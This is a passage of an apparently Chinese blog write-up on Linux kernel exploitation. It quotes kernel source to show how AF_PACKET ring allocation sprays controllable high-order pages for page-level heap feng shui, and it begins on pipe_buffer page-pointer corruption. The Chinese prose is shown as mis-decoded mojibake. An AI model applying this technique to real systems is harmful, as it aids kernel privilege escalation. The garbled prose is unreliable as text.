class="line">64</span><br></pre></td><td class="code"><pre><span class="line">packet_setsockopt(struct socket *sock, <span class="keyword">int</span> level, <span class="keyword">int</span> optname, <span class="keyword">sockptr_t</span> optval,</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> optlen)</span><br><span class="line">&#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">sock</span> *<span class="title">sk</span> =</span> sock-&gt;sk;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">packet_sock</span> *<span class="title">po</span> =</span> pkt_sk(sk);</span><br><span class="line"><span class="keyword">int</span> ret;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (level != SOL_PACKET)</span><br><span class="line"><span class="keyword">return</span> -ENOPROTOOPT;</span><br><span class="line"></span><br><span class="line"><span class="keyword">switch</span> (optname) &#123;</span><br><span class="line"><span class="keyword">case</span> PACKET_ADD_MEMBERSHIP:</span><br><span class="line"><span class="keyword">case</span> PACKET_DROP_MEMBERSHIP:</span><br><span class="line">&#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">packet_mreq_max</span> <span class="title">mreq</span>;</span></span><br><span class="line"><span class="keyword">int</span> len = optlen;</span><br><span class="line"><span class="built_in">memset</span>(&amp;mreq, <span class="number">0</span>, <span class="keyword">sizeof</span>(mreq));</span><br><span class="line"><span class="keyword">if</span> (len &lt; <span class="keyword">sizeof</span>(struct packet_mreq))</span><br><span class="line"><span class="keyword">return</span> -EINVAL;</span><br><span class="line"><span class="keyword">if</span> (len &gt; <span class="keyword">sizeof</span>(mreq))</span><br><span class="line">len = <span class="keyword">sizeof</span>(mreq);</span><br><span class="line"><span class="keyword">if</span> (copy_from_sockptr(&amp;mreq, optval, len))</span><br><span class="line"><span class="keyword">return</span> -EFAULT;</span><br><span class="line"><span class="keyword">if</span> (len &lt; (mreq.mr_alen + offsetof(struct packet_mreq, mr_address)))</span><br><span class="line"><span class="keyword">return</span> -EINVAL;</span><br><span class="line"><span class="keyword">if</span> (optname == PACKET_ADD_MEMBERSHIP)</span><br><span class="line">ret = packet_mc_add(sk, &amp;mreq);</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">ret = packet_mc_drop(sk, &amp;mreq);</span><br><span class="line"><span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">case</span> PACKET_RX_RING:</span><br><span class="line"><span class="keyword">case</span> PACKET_TX_RING:</span><br><span class="line">&#123;</span><br><span class="line"><span class="class"><span class="keyword">union</span> <span class="title">tpacket_req_u</span> <span class="title">req_u</span>;</span></span><br><span class="line"><span class="keyword">int</span> len;</span><br><span class="line"></span><br><span class="line">lock_sock(sk);</span><br><span class="line"><span class="keyword">switch</span> (po-&gt;tp_version) &#123;</span><br><span class="line"><span class="keyword">case</span> TPACKET_V1:</span><br><span class="line"><span class="keyword">case</span> TPACKET_V2:</span><br><span class="line">len = <span class="keyword">sizeof</span>(req_u.req);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> TPACKET_V3:</span><br><span class="line"><span class="keyword">default</span>:</span><br><span class="line">len = <span class="keyword">sizeof</span>(req_u.req3);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (optlen &lt; len) &#123;</span><br><span class="line">ret = -EINVAL;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line"><span class="keyword">if</span> (copy_from_sockptr(&amp;req_u.req, optval, len))</span><br><span class="line">ret = -EFAULT;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">ret = packet_set_ring(sk, &amp;req_u, <span class="number">0</span>,</span><br><span class="line">    optname == PACKET_TX_RING);</span><br><span class="line">&#125;</span><br><span class="line">release_sock(sk);</span><br><span class="line"><span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br><span class="line">      ... ...</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å¯ä»¥çœ‹åˆ°å½“æˆ‘ä»¬çš„<code>optname</code>ä¸º<code>PACKET_TX_RING</code>æ—¶ä¼šè°ƒç”¨åˆ°<code>packet_set_ring</code>ï¼Œå› ä¸ºæ­¤æ—¶lençš„å…³ç³»ï¼Œæˆ‘ä»¬è¿˜éœ€è¦è®¾ç½®<code>po-&gt;tp_version</code>ä¸º<code>TPACKET_V1</code>/<code>TPACKET_V2</code>ã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">case</span> PACKET_VERSION:</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">int</span> val;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (optlen != <span class="keyword">sizeof</span>(val))</span><br><span class="line"><span class="keyword">return</span> -EINVAL;</span><br><span class="line"><span class="keyword">if</span> (copy_from_sockptr(&amp;val, optval, <span class="keyword">sizeof</span>(val)))</span><br><span class="line"><span class="keyword">return</span> -EFAULT;</span><br><span class="line"><span class="keyword">switch</span> (val) &#123;</span><br><span class="line"><span class="keyword">case</span> TPACKET_V1:</span><br><span class="line"><span class="keyword">case</span> TPACKET_V2:</span><br><span class="line"><span class="keyword">case</span> TPACKET_V3:</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">default</span>:</span><br><span class="line"><span class="keyword">return</span> -EINVAL;</span><br><span class="line">&#125;</span><br><span class="line">lock_sock(sk);</span><br><span class="line"><span class="keyword">if</span> (po-&gt;rx_ring.pg_vec || po-&gt;tx_ring.pg_vec) &#123;</span><br><span class="line">ret = -EBUSY;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">po-&gt;tp_version = val;</span><br><span class="line">ret = <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line">release_sock(sk);</span><br><span class="line"><span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æƒ³è¦ä¿®æ”¹åˆ°<code>po-&gt;tp_version</code>éœ€è¦è¿›å…¥åˆ°è¿™ä¸ªcaseï¼Œæ‰€ä»¥éœ€è¦è¿›è¡Œä¸¤æ¬¡è°ƒç”¨ã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">packet_set_ring</span><span class="params">(struct sock *sk, <span class="keyword">union</span> tpacket_req_u *req_u,</span></span></span><br><span class="line"><span class="params"><span class="function"><span class="keyword">int</span> closing, <span class="keyword">int</span> tx_ring)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">pgv</span> *<span class="title">pg_vec</span> =</span> <span class="literal">NULL</span>;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">packet_sock</span> *<span class="title">po</span> =</span> pkt_sk(sk);</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> *rx_owner_map = <span class="literal">NULL</span>;</span><br><span class="line"><span class="keyword">int</span> was_running, order = <span class="number">0</span>;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">packet_ring_buffer</span> *<span class="title">rb</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">sk_buff_head</span> *<span class="title">rb_queue</span>;</span></span><br><span class="line">__be16 num;</span><br><span class="line"><span class="keyword">int</span> err;</span><br><span class="line"><span class="comment">/* Added to avoid minimal code churn */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">tpacket_req</span> *<span class="title">req</span> =</span> &amp;req_u-&gt;req;</span><br><span class="line"></span><br><span class="line">rb = tx_ring ? &amp;po-&gt;tx_ring : &amp;po-&gt;rx_ring;</span><br><span class="line">rb_queue = tx_ring ? &amp;sk-&gt;sk_write_queue : &amp;sk-&gt;sk_receive_queue;</span><br><span class="line"></span><br><span class="line">err = -EBUSY;</span><br><span class="line"><span class="keyword">if</span> (!closing) &#123;</span><br><span class="line"><span class="keyword">if</span> (atomic_read(&amp;po-&gt;mapped))</span><br><span class="line"><span class="keyword">goto</span> out;</span><br><span class="line"><span class="keyword">if</span> (packet_read_pending(rb))</span><br><span class="line"><span class="keyword">goto</span> out;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (req-&gt;tp_block_nr) &#123;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> min_frame_size;</span><br><span class="line"></span><br><span class="line">... ...</span><br><span class="line"></span><br><span class="line">err = -ENOMEM;</span><br><span class="line">order = get_order(req-&gt;tp_block_size);</span><br><span class="line">pg_vec = alloc_pg_vec(req, order);</span><br><span class="line">    ... ...</span><br><span class="line">  &#125;</span><br><span class="line">  ... ...</span><br><span class="line">  <span class="keyword">if</span> (closing || atomic_read(&amp;po-&gt;mapped) == <span class="number">0</span>) &#123;</span><br><span class="line">err = <span class="number">0</span>;</span><br><span class="line">spin_lock_bh(&amp;rb_queue-&gt;lock);</span><br><span class="line">swap(rb-&gt;pg_vec, pg_vec);</span><br><span class="line"><span class="keyword">if</span> (po-&gt;tp_version &lt;= TPACKET_V2)</span><br><span class="line">swap(rb-&gt;rx_owner_map, rx_owner_map);</span><br><span class="line">rb-&gt;frame_max = (req-&gt;tp_frame_nr - <span class="number">1</span>);</span><br><span class="line">rb-&gt;head = <span class="number">0</span>;</span><br><span class="line">rb-&gt;frame_size = req-&gt;tp_frame_size;</span><br><span class="line">spin_unlock_bh(&amp;rb_queue-&gt;lock);</span><br><span class="line"></span><br><span class="line">swap(rb-&gt;pg_vec_order, order);</span><br><span class="line">swap(rb-&gt;pg_vec_len, req-&gt;tp_block_nr);</span><br><span class="line"></span><br><span class="line">rb-&gt;pg_vec_pages = req-&gt;tp_block_size/PAGE_SIZE;</span><br><span class="line">po-&gt;prot_hook.func = (po-&gt;rx_ring.pg_vec) ?</span><br><span class="line">tpacket_rcv : packet_rcv;</span><br><span class="line">skb_queue_purge(rb_queue);</span><br><span class="line"><span class="keyword">if</span> (atomic_read(&amp;po-&gt;mapped))</span><br><span class="line">pr_err(<span class="string">&quot;packet_mmap: vma is busy: %d\n&quot;</span>,</span><br><span class="line">       atomic_read(&amp;po-&gt;mapped));</span><br><span class="line">&#125;</span><br><span class="line">  ... ...</span><br><span class="line">out_free_pg_vec:</span><br><span class="line"><span class="keyword">if</span> (pg_vec) &#123;</span><br><span class="line">bitmap_free(rx_owner_map);</span><br><span class="line">free_pg_vec(pg_vec, order, req-&gt;tp_block_nr);</span><br><span class="line">&#125;</span><br><span class="line">out:</span><br><span class="line"><span class="keyword">return</span> err;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å¯ä»¥çœ‹åˆ°è¿™é‡Œçš„orderæ˜¯ç”±<code>req-&gt;tp_block_size</code>ç¡®å®šçš„ï¼Œè€Œä¸”reqæ˜¯ç”¨æˆ·å¯ä»¥æ§åˆ¶çš„ï¼Œæ‰€ä»¥è¿™é‡Œçš„ç”³è¯·çš„pageçš„orderä¹Ÿæ˜¯å¯æ§çš„ã€‚å¹¶ä¸”éœ€è¦æ³¨æ„çš„æ˜¯åœ¨<code>if (closing || atomic_read(&amp;po-&gt;mapped) == 0)</code>è¿™ä¸ªæ¡ä»¶åˆ†æ”¯ä¸­ï¼Œä¼šäº¤æ¢<code>rb-&gt;pg_vec</code>ä¸­çš„å†…å®¹å’Œå½“å‰å‡½æ•°ä¸­å˜é‡<code>pg_vec</code>ä¸­çš„å†…å®¹ï¼Œæ‰€ä»¥åœ¨æœ€åä¸ä¼šæ‰§è¡Œåˆ°<code>free_pg_vec</code>å‡½æ•°ã€‚</p><h3 id="é‡Šæ”¾"><a href="#é‡Šæ”¾" class="headerlink" title="é‡Šæ”¾"></a>é‡Šæ”¾</h3><p>è¿™é‡Œçš„é‡Šæ”¾æµç¨‹å¾ˆç®€å•ï¼š<code>packet_release</code>=&gt;<code>packet_set_ring</code>=&gt;<code>free_pg_vec</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">free_pg_vec</span><span class="params">(struct pgv *pg_vec, <span class="keyword">unsigned</span> <span class="keyword">int</span> order,</span></span></span><br><span class="line"><span class="params"><span class="function"><span class="keyword">unsigned</span> <span class="keyword">int</span> len)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> i;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; len; i++) &#123;</span><br><span class="line"><span class="keyword">if</span> (likely(pg_vec[i].buffer)) &#123;</span><br><span class="line"><span class="keyword">if</span> (is_vmalloc_addr(pg_vec[i].buffer))</span><br><span class="line">vfree(pg_vec[i].buffer);</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">free_pages((<span class="keyword">unsigned</span> <span class="keyword">long</span>)pg_vec[i].buffer,</span><br><span class="line">   order);</span><br><span class="line">pg_vec[i].buffer = <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">kfree(pg_vec);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å¯ä»¥çœ‹åˆ°å°±æ˜¯å°†é‡Œé¢çš„å†…å®¹ç»™é‡Šæ”¾æ‰ã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">packet_release</span><span class="params">(struct socket *sock)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">sock</span> *<span class="title">sk</span> =</span> sock-&gt;sk;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">packet_sock</span> *<span class="title">po</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">packet_fanout</span> *<span class="title">f</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">net</span> *<span class="title">net</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">union</span> <span class="title">tpacket_req_u</span> <span class="title">req_u</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!sk)</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">... ...</span><br><span class="line"></span><br><span class="line">lock_sock(sk);</span><br><span class="line"><span class="keyword">if</span> (po-&gt;rx_ring.pg_vec) &#123;</span><br><span class="line"><span class="built_in">memset</span>(&amp;req_u, <span class="number">0</span>, <span class="keyword">sizeof</span>(req_u));</span><br><span class="line">packet_set_ring(sk, &amp;req_u, <span class="number">1</span>, <span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (po-&gt;tx_ring.pg_vec) &#123;</span><br><span class="line"><span class="built_in">memset</span>(&amp;req_u, <span class="number">0</span>, <span class="keyword">sizeof</span>(req_u));</span><br><span class="line">packet_set_ring(sk, &amp;req_u, <span class="number">1</span>, <span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line">  ... ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å¾ˆå®¹æ˜“æ³¨æ„åˆ°çš„æ˜¯éƒ½è°ƒç”¨çš„<code>packet_set_ring</code>å‡½æ•°ï¼Œè€Œåœ¨<code>packet_release</code>å‡½æ•°ä¸­æ‰€ç»™çš„å‚æ•°ä¸­ç¬¬ä¸‰ä¸ªå‚æ•°ä¸º1ã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">packet_set_ring</span><span class="params">(struct sock *sk, <span class="keyword">union</span> tpacket_req_u *req_u,</span></span></span><br><span class="line"><span class="params"><span class="function"><span class="keyword">int</span> closing, <span class="keyword">int</span> tx_ring)</span></span></span><br></pre></td></tr></table></figure><p>å¯¹æ¯”å‡½æ•°å£°æ˜å¯ä»¥çœ‹å‡ºæ¥è¿™ä¸ªå‚æ•°å°±ä»£è¡¨è¦å…³é—­äº†ï¼Œå¹¶ä¸”åœ¨æ‰§è¡Œè¿™ä¸ªå‡½æ•°ä¹‹å‰<code>memset(&amp;req_u, 0, sizeof(req_u));</code>æ‰§è¡Œäº†è¿™æ ·ä¸€æ¡è¯­å¥ï¼Œä¹Ÿå°±å¯¼è‡´reqä¸­çš„æ‰€æœ‰å†…å®¹éƒ½ä¸º<code>\x00</code>ï¼Œä¹Ÿå°±ä¸è¿›å…¥åˆ†é…çš„åˆ†æ”¯ä¸­å»äº†ã€‚ä¸è¿‡ä¾æ—§ä¼šè¿›å…¥åˆ°è¿›è¡Œå„ç§swapçš„åˆ†æ”¯ï¼Œå› ä¸ºåœ¨åˆ†é…æ—¶èµ°è¿‡ä¸€æ¬¡ï¼Œæ‰€ä»¥è¿™æ¬¡æœ€åä¼šè°ƒç”¨åˆ°<code>free_pg_vec</code>å‡½æ•°äº†ï¼Œè€Œè¿™ä¸ªå‡½æ•°åœ¨è¿™é‡Œè¯´äº†å°±æ˜¯é‡Šæ”¾æ‰æ‰€æœ‰é¡µé¢ã€‚</p><h3 id="æ€»ç»“"><a href="#æ€»ç»“" class="headerlink" title="æ€»ç»“"></a>æ€»ç»“</h3><p>å½“æˆ‘ä»¬è€—å°½ buddy system ä¸­çš„ low order pages åï¼Œæˆ‘ä»¬å†è¯·æ±‚çš„é¡µé¢ä¾¿éƒ½æ˜¯ç‰©ç†è¿ç»­çš„ï¼Œå› æ­¤æ­¤æ—¶æˆ‘ä»¬å†è¿›è¡Œ <code>setsockopt()</code> ä¾¿ç›¸å½“äºè·å–åˆ°äº†ä¸€å—è¿‘ä¹ç‰©ç†è¿ç»­çš„å†…å­˜ï¼ˆä¸ºä»€ä¹ˆæ˜¯â€è¿‘ä¹è¿ç»­â€œæ˜¯å› ä¸ºå¤§é‡çš„ <code>setsockopt()</code> æµç¨‹ä¸­åŒæ ·ä¼šåˆ†é…å¤§é‡æˆ‘ä»¬ä¸éœ€è¦çš„ç»“æ„ä½“ï¼Œä»è€Œæ¶ˆè€— buddy system çš„éƒ¨åˆ†é¡µé¢ï¼‰ã€‚</p><p>æ‰€ä»¥è¿™é‡Œçš„ä½¿ç”¨æµç¨‹å°±æ˜¯ï¼Œå…ˆä½¿ç”¨ä¸Šè¿°åŠæ³•è¿›è¡Œå †å–·ã€‚</p><ol><li>  é‡Šæ”¾ä¸€éƒ¨åˆ†orderä¸º3çš„pageï¼Œæ¥ç€ä½¿ç”¨victim objectè¿›è¡Œç”³è¯·è¿™äº›é¡µé¢</li><li>  é‡Šæ”¾ä¸€ä¸ªé¡µé¢ï¼Œä½¿ç”¨vuln objectç”³è¯·è¿™ä¸€é¡µé¢</li><li>  é‡Šæ”¾ä¸€éƒ¨åˆ†orderä¸º3çš„pageï¼Œå†æ¬¡è®©victim objectç”³è¯·åˆ°</li></ol><p><img                       lazyload                     src="/images/loading.svg"                     data-src="/images/VvPk5nKYmDCWxOs.png"                      alt="å†å·"                ></p><p>æœ€ç»ˆå®ç°ä¸Šå›¾è¿™æ ·çš„æ•ˆæœã€‚</p><h2 id="pipe-buffer"><a href="#pipe-buffer" class="headerlink" title="pipe_buffer"></a>pipe_buffer</h2><p>åœ¨ä»¥å¾€çš„æ–‡ç« ä¸­å‡ºç°äº†å¾ˆå¤šæ¬¡çš„<code>pipe_buffer</code>ï¼Œä½†æ˜¯å¯æƒœçš„æ˜¯ä½¿ç”¨çš„æ–¹å¼è¿‡äºç®€å•ã€‚æ¯”å¦‚ï¼Œåªæ˜¯ç®€å•çš„åˆ©ç”¨ä»–çš„opsæŒ‡é’ˆè¿›è¡Œæ³„æ¼æˆ–è€…è¦†ç›–å®ƒæ§åˆ¶æ‰§è¡Œæµï¼Œå†å°±æ˜¯<code>Dirty Pipe</code>ä¸­çš„åˆ©ç”¨ã€‚å¯æ¨çš„æ˜¯æˆ‘åœ¨åšé¢˜çš„è¿‡ç¨‹ä¸­å¹¶æ²¡æœ‰æƒ³åˆ°ä½¿ç”¨<code>Dirty Pipe</code>ï¼Œå³ä¾¿æ˜¯å½“æ—¶æˆ‘å·²ç»å¯¹<code>pipe_buffer</code>æ‰€åœ¨çš„å †å—ä¸Šæœ‰ç»å¯¹çš„æƒé™äº†ã€‚æ‰€ä»¥è¿™é‡Œå°±ä¸å†åªæ˜¯å¯¹å…¶opsçš„åˆ©ç”¨äº†ï¼Œåé¢ä¸»è¦å°±æ˜¯ç ´åå…¶<code>page</code>æŒ‡é’ˆäº†ã€‚</p><h3 id="pipe-bufferåˆ†é…è¿‡ç¨‹"><a href="#pipe-bufferåˆ†é…è¿‡ç¨‹" class="headerlink" title="pipe_bufferåˆ†é…è¿‡ç¨‹"></a>pipe_bufferåˆ†é…è¿‡ç¨‹</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PIPE_DEF_BUFFERS16</span></span><br><span class="line"></span><br><span class="line"><span class="function">struct pipe_inode_info *<span class="title">alloc_pipe_info</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">pipe_inode_info</span> *<span class="title">pipe</span>;</span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> pipe_bufs = PIPE_DEF_BUFFERS;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">user_struct</span> *<span class="title">user</span> =</span> get_current_user();</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> user_bufs;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> max_size = READ_ONCE(pipe_max_size);</span><br><span class="line"></span><br><span class="line">pipe = kzalloc(<span class="keyword">sizeof</span>(struct pipe_inode_info), GFP_KERNEL_ACCOUNT);</span><br><span class="line"><span class="keyword">if</span> (pipe == <span class="literal">NULL</span>)</span><br><span class="line"><span class="keyword">goto</span> out_free_uid;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (pipe_bufs * PAGE_SIZE &gt; max_size &amp;&amp; !capable(CAP_SYS_RESOURCE))</span><br><span class="line">pipe_bufs = max_size &gt;&gt; PAGE_SHIFT;</span><br><span class="line"></span><br><span class="line">user_bufs = account_pipe_buffers(user, <span class="number">0</span>, pipe_bufs);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (too_many_pipe_buffers_soft(user_bufs) &amp;&amp; pipe_is_unprivileged_user()) &#123;</span><br><span class="line">user_bufs = account_pipe_buffers(user, pipe_bufs, PIPE_MIN_DEF_BUFFERS);</span><br><span class="line">pipe_bufs = PIPE_MIN_DEF_BUFFERS;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (too_many_pipe_buffers_hard(user_bufs) &amp;&amp; pipe_is_unprivileged_user())</span><br><span class="line"><span class="keyword">goto</span> out_revert_acct;</span><br><span class="line"></span><br><span class="line">pipe-&gt;bufs = kcalloc(pipe_bufs, <span class="keyword">sizeof</span>(struct pipe_buffer),</span><br><span class="line">     GFP_KERNEL_ACCOUNT);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (pipe-&gt;bufs) &#123;</span><br><span class="line">init_waitqueue_head(&amp;pipe-&gt;rd_wait);</span><br><span class="line">init_waitqueue_head(&amp;pipe-&gt;wr_wait);</span><br><span class="line">pipe-&gt;r_counter = pipe-&gt;w_counter = <span class="number">1</span>;</span><br><span class="line">pipe-&gt;max_usage = pipe_bufs;</span><br><span class="line">pipe-&gt;ring_size = pipe_bufs;</span><br><span class="line">pipe-&gt;nr_accounted = pipe_bufs;</span><br><span class="line">pipe-&gt;user = user;</span><br><span class="line">mutex_init(&amp;pipe-&gt;mutex);</span><br><span class="line"><span class="keyword">return</span> pipe;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">out_revert_acct:</span><br><span class="line">(<span class="keyword">void</span>) account_pipe_buffers(user, pipe_bufs, <span class="number">0</span>);</span><br><span class="line">kfree(pipe);</span><br><span class="line">out_free_uid:</span><br><span class="line">free_uid(user);</span><br><span class="line"><span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å¯ä»¥çœ‹åˆ°åœ¨åé¢ç”³è¯·<code>pipe-&gt;bufs</code>ä½¿ç”¨äº†<code>kcalloc</code>å‡½æ•°ï¼Œè€Œè¿™ä¸ªå‡½æ•°çš„ç¬¬ä¸€ä¸ªå‚æ•°åˆ†é…çš„æ•°é‡ï¼Œç¬¬äºŒå‚æ•°å°±æ˜¯æ¯ä¸€ä¸ªå•ä½çš„å¤§å°ã€‚å…¶å®åœ¨å…¶å†…éƒ¨ä¸­ä¹Ÿæ˜¯ä¼šå°†è¿™ä¸¤ä¸ªå‚æ•°ç›¸ä¹˜èµ·æ¥çš„ï¼Œè€Œè¿™ä¸¤ä¸ªå€¼å…¶å®éƒ½æ˜¯å·²çŸ¥çš„ï¼Œç¬¬ä¸€ä¸ªä¸º16ï¼Œç¬¬äºŒä¸ªä¸º40ï¼Œé‚£ä¹ˆä»–ä»¬çš„ç»“æœå°±æ˜¯640ã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span 